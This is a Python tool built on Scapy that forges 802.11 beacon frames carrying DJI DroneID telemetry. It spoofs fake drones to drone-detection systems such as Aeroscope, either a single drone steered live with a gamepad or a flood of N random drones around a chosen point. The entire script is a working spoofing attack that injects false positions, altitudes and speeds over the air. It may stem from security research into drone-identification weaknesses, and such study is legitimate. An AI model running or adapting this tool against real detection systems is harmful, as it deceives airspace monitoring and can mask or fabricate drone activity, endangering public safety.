from Beacon import *
import struct
import sys, getopt, argparse
from scapy.sendrecv import sendp, send
import random, string
from math import floor, sqrt
import jstest
import time, os, calendar
import threading
from Drone import *
from scapy.utils import PcapWriter

MAX_TRIGGERS = 1023
MAX_JXY = 32767


'''
   Assemble the DJI payload to a 802.11 beacon packet
'''
def create_packet(beacon_base, payload):
    packet = beacon_base.copy()  

    # Not necessary but it appears in different DJI models
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')

    # DJI Payload
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(payload) + 3,oui=0x263712, info = payload)
    packet = packet / vendor_microsoft / tag_vendor_dji 

    return packet


'''
Update the DJI Vendor ID info from the Scapy Beacon object
'''
def update_packet(prev_packet, new_payload):
    
    ts = calendar.timegm(time.gmtime())
    prev_packet.timestamp = ts
    # New DJI Payload
    new_tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(new_payload) + 3,oui=0x263712, info = new_payload)

    #is the last Vendor Specific tag... in case we added the Microsoft Vendor Tag
    prev_packet[Dot11EltVendorSpecific][len([prev_packet[Dot11EltVendorSpecific]])-1].payload = new_tag_vendor_dji
    return prev_packet



is_event = 0
'''
The sendp() from Scapy uses a loop that stops only when Ctr+C is pressed.
We want to stop sending a previous payload and start sending a new one
This is a simple way to stop sending a packet.
At the same time, it can be send a packet while the controller is waiting for events (cuz it's also blocking)
'''
def thread_send(packet):
    print("Start Thread")
    count = 0
    global is_event
    while is_event == 0:
        count += 1
        try:
            sendp(packet[1], iface=interface, verbose=0, loop=0, count=3)
            time.sleep(1)
        except KeyboardInterrupt:
            break
    time.sleep(0.1)
    print("Exiting Thread. Packet sent {} times".format(count))


def normalize(value, max=MAX_TRIGGERS, minimum=1):
    n = (value - minimum) / (max - minimum)
    return n


'''
Single Drone Spoofing
If it does not get any input, the values are set randomly

If it detects a joystic, it will process the events and will update drone's values.
'''
def one_drone():
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    altitude = (input("Altitude (Max 65535): "))
    home_lat = (input("Home Latitude: "))
    home_long = (input("Home Longitude: "))
    uuid = str(input("UUID (16 chars): "))
  

    # Create base beacon packet for carrying info of a drone
    source_address = "60:60:1f:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))    
    if len(ssid) == 0:
        ssid = "MAVIC_AIR_REAL"
    beacon_base_packet = Beacon(source_address, ssid).get_beacon()

    # Set drone's initial attributes
    drone = Drone(ssid=ssid, lat=lat, lon=lon, altitude=altitude, home_lat=home_lat, home_lon=home_long, uuid=uuid)


    # ==== BUILD PACKET LIST =====
    # Flight Info beacons It won't change
    finfo_payload = drone.build_finfo() # ToDo Get user input toset flight info
    finfo_packet = create_packet(beacon_base_packet,finfo_payload)
    # Create the DJI payload in bytes and build the packet with scapy
    telemetry_payload = drone.build_telemetry()
    telemetry_packet = create_packet(beacon_base_packet, telemetry_payload)
    
    packet_list = []
    packet_list.append(finfo_packet)
    packet_list.append(telemetry_packet)

    joystick = jstest.JSTest()
    print("Joystick  {}".format(joystick.gamepad))

    if joystick.gamepad:
        #ts= time.time()
        global is_event
        drone.v_east = 0
        drone.v_north = 0

        updated = True
        while 1:      
            try:
                # Start sending packets in a different thread since Joystick is blocking when waiting for events
                if updated is True:
                    send_thread = threading.Thread(target=thread_send, args=(packet_list,))
                    send_thread.start()

                updated = True  # Reset        
                print("Waiting event")
                events = joystick.gamepad._do_iter() # It blocks untl event is detected
                print("New Event")

                
                #does not work still blocks...
                if events is None or len(events) == 0:
                    print("About to break. No events... but does not work")
                    break

                for event in events:
                    joystick.process_event(event)
                    axis, value = joystick.axis, joystick.axis_value

                    print("Event:  {} {}".format(axis, value))

                    if axis is None and value == 0:
                        # The event does not have any action assigned
                        updated = False
                        continue

                    elif axis == "X": # Increase Longitude and speed according to value
                        print("Update longitude")
                        
                        try:
                            value_sign = float(value / abs(value)) #( -1 or 1)
                        except ZeroDivisionError:
                            updated = False
                            continue

                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value_sign/ 1000))) # To modify the 4 decimal digit

                        new_speed = 25 * normalize (value, max=MAX_JXY)
                        drone.v_east =  new_speed * 100 #ToDo check sign (drone.v_east + 100 * value)  * value # All the time will increase the speed. 
       

                    elif axis == "Y": # Modify Latitude
                        print("Update latitude")
                        try:
                            value_sign = float(value / abs(value)) #( -1 or 1)
                        except ZeroDivisionError:
                            updated = False
                            continue
                        
                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value_sign / 1000))) * (-1) # invert sign: left should be positiv and right negative. Controller returns the other way

                        new_speed = 25 * normalize (-value, max=MAX_JXY)
                        drone.v_north =  new_speed * 100 #ToDo check sign 

                    if axis == "HAT0X": # Modify Longitude
                        print("Update longitude")

                        if value == 0:
                            updated = False # Released arrow
                            continue

                        # To modify the 4 decimal digit
                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value/ 1000))) 
                        drone.v_east =  (drone.v_east + 100 * value)   # All the time will increase the speed and the pointer will point to that direction
                        drone.v_north =  (drone.v_north - 50) if drone.v_north > 0 else drone.v_north + 50 # To reduce the speed on the other axis
                            

                    elif axis == "HAT0Y": # Modify Latitude
                        print("Update latitude")
                        
                        if value == 0:
                            updated = False
                            continue

                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value / 1000))) * (-1) # -1 because the value of the Y axis in XBOX controller is -1 for up and 1 for down. We want to increase latitude if we press up.
                        drone.v_north =  (drone.v_north +  (-value) * 100)
                        drone.v_east =  (drone.v_east - 50) if drone.v_east > 0 else drone.v_east + 50
                        
                    elif axis == "RY":
                        print("Update altitude")
                       # Increase Altitude (and Vertical Speed)
                        # Minimum Altitude 0. ToDo limit upper boundary
                        try:
                            value_sign = float(value / abs(value)) #( -1 or 1)
                            print("Altitude value sign {}".format(value_sign))
                        except ZeroDivisionError:
                            updated = False
                            continue
                        if drone.altitude >= 0 and drone.altitude < 2**16-1:                       
                            drone.altitude = drone.altitude + value_sign * (-1) # Same reason. Axis value sign is inverted
                            if drone.altitude <0:
                                drone.altitude = 0

                    elif axis == "RX":
                        # modify yaw
                        update = False
                        continue
                        

                   # Change speed to show 3 different colors.
                    elif axis == "TL" and value == 1: # Skip when button released event.
                        drone.v_east =  (drone.v_east + 200) % 2500# speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
                        drone.v_north = (drone.v_east + 200) % 2500
                        
                    elif axis == "Z": # Increase speed, both in X and Y axis

                        if value == 0: # If not pressed
                            drone.v_north = 0
                            drone.v_east = 0

                        # Consider if speed is in negative or positive
                        elif value == MAX_TRIGGERS: # keep increasing
                            drone.v_east = drone.v_east + 100 if drone.v_east > 0 else drone.v_east - 100
                            drone.v_north = drone.v_north + 100 if drone.v_north > 0 else drone.v_north - 100
                        
                        else: # Speed is related to the value received. Lets normalize it until +-25
                            new_speed = 25 * normalize (value) * 100 # speed multiplies 100 always
                            drone.v_north = new_speed
                            drone.v_east = new_speed
                        
                    elif axis == "MODE":
                        if value == 0:
                            updated = False
                            continue
                        drone.longitude, drone.latitude = drone.random_location()


                    #elif axis == "RZ": # Decrease speed in both horizontal axis
                     #   drone.v_east = drone.v_east - 100 if drone.v_east > 0 else drone.v_east + 100
                      #  drone.v_north = drone.v_north - 100  if drone.v_north > 0 else drone.v_north + 100

                if not updated:
                    # Thread keeps sending the same packet
                    print("Packet not updated")
                    # is_event = 0
                    continue

                # Stop thread if packet is updated
                updated = True
                is_event = 1
                print("Exiting thread (main). Join")
                send_thread.join()
                time.sleep(0.2)
                print("Joined")

                #Create new payload and update packet
                new_payload = drone.build_telemetry()
                #print(packet_list[1][Dot11EltVendorSpecific].show(dump=True))

                packet_list[1] = update_packet(packet_list[1], new_payload)
                print("UPDATED")
                #print(packet_list[1][Dot11EltVendorSpecific].show(dump=True))
                #packet_list[1] = update_packet(packet_list[1], new_payload)
                is_event = 0 # new loop iteration we start thread sending new payload

            except KeyboardInterrupt:
                is_event = 1
                break

            print("Latitude: {} --- Longitude: {}".format(drone.latitude, drone.longitude))
            print("Altitude: {} ".format(drone.altitude))
            print("Speed: {}".format(sqrt(drone.v_north **2 + drone.v_east **2)/100))


    
    else:
        '''
        Spoofing a single drone without any motion
        '''      
        sendp(packet_list, iface=interface, loop=1, inter=0.5)

def random_spoof(n, point=None):
    
    n_drones = n
    # ToDo Check if I need to copy the packet, or otherwise it reuses the same

    source_address = ""
    ssid = ""
    beacon = Beacon(source_address, ssid ) #
    beacon_base_packet = beacon.get_beacon()

    packet_list = [] # set of packets to be sent
    # First all packets are generated and they will be sent afterwards
    for i in range( int(n_drones)):
        beacon_base_copy = beacon_base_packet.copy()
        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")
        
        drone = Drone(i, point)
        beacon_base_copy.ssid =  drone.ssid
        beacon_base_copy.addr2 = drone.mac_address
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))
        print("Location [Lon Lat]: {} {}".format(drone.longitude, drone.latitude))   
        # Build DJI Payload
        payload = drone.build_telemetry()
        telemetry_packet = create_packet(beacon_base_copy, payload)
        packet_list.append(telemetry_packet)
    
    print("=========All drones are ready ==================")
    #pktdump = PcapWriter("telemetry.pcap", append=True, sync=True)
    #pktdump.write(telemetry_packet)
    sendp(packet_list, iface=interface, loop=1, inter=2)


'''
=====================================================================
Main
Arguments indicate whether to spoof a single specific drone or N random drones (around a given point)
=====================================================================
'''

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")
parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")

args = parser.parse_args()
print("Arguments: {}".format(args))

if not args.interface:
    raise SystemExit(
"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'> \n \
-r N            Spoof N random drones around the map. \n \
-a 'lat long'     If set, drones are spoofed around point \n \
Interface must be in monitor mode")

else:

    interface = args.interface
    
    if args.random : # Consider fail when you pass 0 drones... ToDo
        n_random = args.random
        
        print("Spoofing {} drones".format(n_random))
        if args.area:
            point = args.area.split()
            print(point)
            random_spoof(n_random, point)
        random_spoof(n_random)

    else: #Spoof only one drone
        one_drone()